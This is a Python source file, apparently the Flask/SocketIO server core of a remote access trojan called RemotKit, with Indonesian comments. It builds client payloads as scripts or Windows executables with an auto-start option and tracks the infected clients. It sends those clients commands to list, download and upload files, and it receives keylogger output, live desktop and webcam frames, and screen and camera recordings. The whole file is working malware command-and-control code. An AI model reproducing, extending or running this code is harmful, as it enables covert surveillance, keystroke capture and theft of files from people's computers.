#!/usr/bin/env python3
"""
REMOTKIT - Remote Access Toolkit (Internal Module)
JANGAN DIJALANKAN LANGSUNG - Gunakan run.py
"""

import sys
import os

# ========== CEGAH EKSEKUSI LANGSUNG ==========
if __name__ == "__main__":
    print("=" * 55)
    print("❌ ERROR: This file is part of RemotKit core only!")
    print("=" * 55)
    print("📌 Please run: python run.py")
    print("=" * 55)
    sys.exit(1)
# ============================================

from flask import Flask, render_template, request, jsonify, make_response, send_from_directory
from flask_socketio import SocketIO, emit
import json
import time
import os
import socket
import platform
import threading
import uuid
import base64
import sys
import subprocess
from datetime import datetime

# Konfigurasi port
SERVER_PORT = 5000

app = Flask(__name__)
app.config['SECRET_KEY'] = 'remotkit-secret-key'
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading', ping_timeout=60, ping_interval=25, max_http_buffer_size=50 * 1024 * 1024)

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
TEMPLATE_FOLDER = os.path.join(BASE_DIR, 'templates')
DOWNLOAD_FOLDER = os.path.join(BASE_DIR, 'downloads')

# Buat folder downloads
os.makedirs(DOWNLOAD_FOLDER, exist_ok=True)

# Import builder module
sys.path.insert(0, BASE_DIR)
from builder import build_exe, build_script, cleanup_downloads

# Dictionary untuk menyimpan data
connected_clients = {}
pending_results = {}
client_last_seen = {}
download_chunks = {}

# Konfigurasi heartbeat timeout (fallback)
HEARTBEAT_TIMEOUT = 30  # detik


def get_server_ip():
    """Mendapatkan IP server yang sebenarnya"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"


def get_server_info():
    return {
        'ip': get_server_ip(),
        'port': SERVER_PORT,
        'platform': platform.system(),
        'python_version': platform.python_version()
    }


def api_clients_json():
    data = {}
    for cid, info in connected_clients.items():
        data[cid] = {
            'id': cid,
            'name': info.get('name', '?'),
            'os': info.get('os', '?'),
            'ip': info.get('ip', '?'),
            'status': info.get('status', 'online')
        }
    return data


# ========== ROUTES ==========
@app.route('/')
def index():
    return render_template('index.html', server_ip=get_server_ip(), server_port=SERVER_PORT)


@app.route('/templates/css/<path:filename>')
def serve_css(filename):
    return send_from_directory(os.path.join(TEMPLATE_FOLDER, 'css'), filename)


@app.route('/templates/js/<path:filename>')
def serve_js(filename):
    return send_from_directory(os.path.join(TEMPLATE_FOLDER, 'js'), filename)


@app.route('/api/info')
def api_info():
    return jsonify(get_server_info())


@app.route('/api/clients')
def api_clients():
    return jsonify(api_clients_json())


@app.route('/api/stats')
def api_stats():
    online = sum(1 for c in connected_clients.values() if c.get('status') == 'online')
    return jsonify({
        'total': len(connected_clients),
        'online': online,
        'offline': len(connected_clients) - online
    })


@app.route('/api/build', methods=['POST'])
def api_build():
    """Build client sebagai script (.py) untuk Linux"""
    data = request.json
    os_type = data.get('os_type', 'linux')
    out_type = data.get('output_type', 'script')
    server_ip = data.get('server_ip', get_server_ip())
    auto_start = data.get('auto_start', False)
    custom_name = data.get('custom_name', '')
    
    client_id = str(uuid.uuid4())[:8]
    output_name = custom_name.strip() if custom_name and custom_name.strip() else f"remotkit_{os_type}"
    
    success, filepath, error = build_script(
        server_ip=server_ip,
        server_port=SERVER_PORT,
        os_type=os_type,
        auto_start=auto_start,
        client_id=client_id,
        output_name=output_name,
        output_type=out_type
    )
    
    if not success:
        return jsonify({'error': error}), 500
    
    with open(filepath, 'r', encoding='utf-8') as f:
        code = f.read()
    
    filename = f"{output_name}.py"
    
    response = make_response(code)
    response.headers['Content-Disposition'] = f'attachment; filename={filename}'
    response.mimetype = 'text/x-python'
    
    try:
        os.remove(filepath)
    except:
        pass
    
    return response


@app.route('/api/build_exe', methods=['POST'])
def api_build_exe():
    """Build client sebagai executable (.exe) menggunakan PyInstaller"""
    data = request.json
    os_type = data.get('os_type', 'windows')
    server_ip = data.get('server_ip', get_server_ip())
    auto_start = data.get('auto_start', False)
    custom_name = data.get('custom_name', '')
    
    if os_type != 'windows':
        return jsonify({'error': 'EXE build only available for Windows target'}), 400
    
    client_id = str(uuid.uuid4())[:8]
    output_name = custom_name.strip() if custom_name and custom_name.strip() else "remotkit_client"
    
    cleanup_downloads(max_age_seconds=3600)
    
    socketio.emit('build_status', {'status': 'building', 'message': 'Building executable...'})
    
    success, filepath, error = build_exe(
        server_ip=server_ip,
        server_port=SERVER_PORT,
        os_type=os_type,
        auto_start=auto_start,
        client_id=client_id,
        output_name=output_name
    )
    
    if not success:
        socketio.emit('build_status', {'status': 'error', 'message': error})
        return jsonify({'error': error}), 500
    
    if not os.path.exists(filepath):
        return jsonify({'error': 'Build completed but file not found'}), 500
    
    with open(filepath, 'rb') as f:
        file_data = f.read()
    
    response = make_response(file_data)
    response.headers['Content-Disposition'] = f'attachment; filename={output_name}.exe'
    response.mimetype = 'application/vnd.microsoft.portable-executable'
    
    try:
        os.remove(filepath)
    except:
        pass
    
    socketio.emit('build_status', {'status': 'complete', 'message': 'Build complete!'})
    
    return response


@app.route('/api/cleanup', methods=['POST'])
def api_cleanup():
    deleted = cleanup_downloads(max_age_seconds=300)
    return jsonify({'deleted': deleted})


# ========== API FILE EXPLORER ==========
@app.route('/api/listdir', methods=['POST'])
def api_listdir():
    data = request.json
    cid = data.get('client_id')
    path = data.get('path', 'C:\\')
    if not cid or cid not in connected_clients:
        return jsonify({'error': 'Client not found'}), 404
    rid = f"listdir_{int(time.time())}"
    socketio.emit('command', {'id': rid, 'type': 'listdir', 'data': {'path': path}}, room=cid)
    for _ in range(30):
        if rid in pending_results:
            return jsonify(pending_results.pop(rid))
        time.sleep(0.1)
    return jsonify({'error': 'Timeout'}), 408


@app.route('/api/download', methods=['POST'])
def api_download():
    data = request.json
    cid = data.get('client_id')
    path = data.get('file_path')
    
    if not cid or cid not in connected_clients:
        return jsonify({'error': 'Client not found'}), 404
    
    rid = f"download_{int(time.time())}"
    download_chunks[rid] = {'chunks': [], 'total': 0, 'filename': '', 'received': 0}
    
    socketio.emit('command', {'id': rid, 'type': 'download', 'data': {'path': path}}, room=cid)
    
    for _ in range(120):
        if rid in download_chunks:
            data = download_chunks[rid]
            if 'content' in data:
                return jsonify({'content': data['content'], 'filename': data['filename']})
            elif 'error' in data:
                return jsonify({'error': data['error']})
        time.sleep(0.5)
    
    if rid in download_chunks:
        del download_chunks[rid]
    return jsonify({'error': 'Timeout'}), 408


@app.route('/api/upload', methods=['POST'])
def api_upload():
    data = request.json
    cid = data.get('client_id')
    name = data.get('file_name')
    path = data.get('file_path', '')
    content = data.get('content')
    if not cid or cid not in connected_clients:
        return jsonify({'error': 'Client not found'}), 404
    full = os.path.join(path, name).replace('\\\\', '\\')
    socketio.emit('command', {'id': f"upload_{int(time.time())}", 'type': 'upload', 'data': {'path': full, 'content': content}}, room=cid)
    return jsonify({'success': True})


# ========== SOCKET HANDLERS ==========
@socketio.on('connect')
def handle_connect():
    print(f"[*] Socket connected: {request.sid}")


@socketio.on('disconnect')
def handle_disconnect():
    cid = request.sid
    if cid in connected_clients:
        client_name = connected_clients[cid].get('name', 'Unknown')
        client_ip = connected_clients[cid].get('ip', 'Unknown')
        del connected_clients[cid]
        print(f"[-] Client removed: {client_name} ({client_ip})")
        socketio.emit('clients_update', api_clients_json())


@socketio.on('register')
def handle_register(data):
    cid = request.sid
    client_name = data.get('name', 'Unknown')
    client_os = data.get('os', 'Unknown')
    client_ip = request.remote_addr
    
    # Cek duplikat (nama + IP sama)
    existing_client_id = None
    for existing_cid, existing_info in connected_clients.items():
        if (existing_info.get('name') == client_name and 
            existing_info.get('ip') == client_ip and
            existing_cid != cid):
            existing_client_id = existing_cid
            break
    
    if existing_client_id:
        print(f"[!] Duplicate removed: {client_name} ({client_ip})")
        del connected_clients[existing_client_id]
    
    connected_clients[cid] = {
        'id': cid,
        'name': client_name,
        'os': client_os,
        'ip': client_ip,
        'status': 'online',
        'last_seen': time.time(),
        'first_seen': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }
    
    print(f"[+] Client registered: {client_name} ({client_os}) - IP: {client_ip}")
    socketio.emit('clients_update', api_clients_json())


@socketio.on('ping')
def handle_ping():
    cid = request.sid
    if cid in connected_clients:
        connected_clients[cid]['last_seen'] = time.time()
        if connected_clients[cid].get('status') != 'online':
            connected_clients[cid]['status'] = 'online'
            socketio.emit('clients_update', api_clients_json())


@socketio.on('command')
def handle_command(data):
    target = data.get('client_id')
    if target not in connected_clients:
        return
    emit('command', {'id': data.get('id'), 'type': data.get('type'), 'data': data.get('data', {})}, room=target)


@socketio.on('result')
def handle_result(data):
    emit('command_result', data, broadcast=True)


@socketio.on('listdir_result')
def handle_listdir_result(data):
    pending_results[data.get('id')] = {'files': data.get('files'), 'error': data.get('error')}


@socketio.on('download_result')
def handle_download_result(data):
    rid = data.get('id')
    if rid in download_chunks:
        download_chunks[rid] = {'content': data.get('content'), 'filename': data.get('filename')}
    print(f"[DOWNLOAD] Result received: {data.get('filename', 'unknown')}")


@socketio.on('download_chunk')
def handle_download_chunk(data):
    rid = data.get('id')
    if not rid:
        return
    
    if rid not in download_chunks:
        download_chunks[rid] = {
            'chunks': [],
            'total': data.get('total_chunks', 0),
            'filename': data.get('filename', 'file'),
            'received': 0
        }
    
    if 'chunks' not in download_chunks[rid]:
        download_chunks[rid]['chunks'] = []
        download_chunks[rid]['received'] = download_chunks[rid].get('received', 0)
    
    download_chunks[rid]['chunks'].append(data.get('chunk', ''))
    download_chunks[rid]['received'] += 1
    
    if download_chunks[rid]['received'] >= download_chunks[rid].get('total', 0):
        all_chunks = ''.join(download_chunks[rid]['chunks'])
        download_chunks[rid] = {'content': all_chunks, 'filename': download_chunks[rid]['filename']}
        print(f"[DOWNLOAD] All chunks received for {rid}")


@socketio.on('keylog_data')
def handle_keylog_data(data):
    emit('command_result', {'result': f"[KEYLOG] {data.get('data', '')}"}, broadcast=True)


@socketio.on('desktop_frame')
def handle_desktop_frame(data):
    emit('desktop_frame', data, broadcast=True)


@socketio.on('camera_frame')
def handle_camera_frame(data):
    emit('camera_frame', data, broadcast=True)


@socketio.on('desktop_recording_data')
def handle_desktop_recording_data(data):
    fn = data.get('filename', f"desktop_{int(time.time())}.mp4")
    d = data.get('data', '')
    if d:
        p = os.path.join(DOWNLOAD_FOLDER, fn)
        with open(p, 'wb') as f:
            f.write(base64.b64decode(d))
        print(f"[+] Desktop recording: {p}")
        emit('command_result', {'result': f"Desktop saved: {fn}"}, broadcast=True)


@socketio.on('camera_recording_data')
def handle_camera_recording_data(data):
    fn = data.get('filename', f"camera_{int(time.time())}.mp4")
    d = data.get('data', '')
    if d:
        p = os.path.join(DOWNLOAD_FOLDER, fn)
        with open(p, 'wb') as f:
            f.write(base64.b64decode(d))
        print(f"[+] Camera recording: {p}")
        emit('command_result', {'result': f"Camera saved: {fn}"}, broadcast=True)


@socketio.on('uninstall_result')
def handle_uninstall_result(data):
    emit('command_result', {'result': data.get('result', 'Uninstall completed')}, broadcast=True)


# ========== HEARTBEAT TIMEOUT CHECK (FALLBACK) ==========
def check_stale_clients():
    """Cek client yang tidak mengirim ping dalam HEARTBEAT_TIMEOUT detik"""
    while True:
        time.sleep(HEARTBEAT_TIMEOUT)
        now = time.time()
        to_remove = []
        
        for cid, info in connected_clients.items():
            last_seen = info.get('last_seen', 0)
            if (now - last_seen) > HEARTBEAT_TIMEOUT + 10:
                to_remove.append(cid)
        
        for cid in to_remove:
            client_name = connected_clients[cid].get('name', 'Unknown')
            del connected_clients[cid]
            print(f"[Fallback] Removed stale client: {client_name}")
        
        if to_remove:
            socketio.emit('clients_update', api_clients_json())


# Mulai thread fallback
fallback_thread = threading.Thread(target=check_stale_clients, daemon=True)
fallback_thread.start()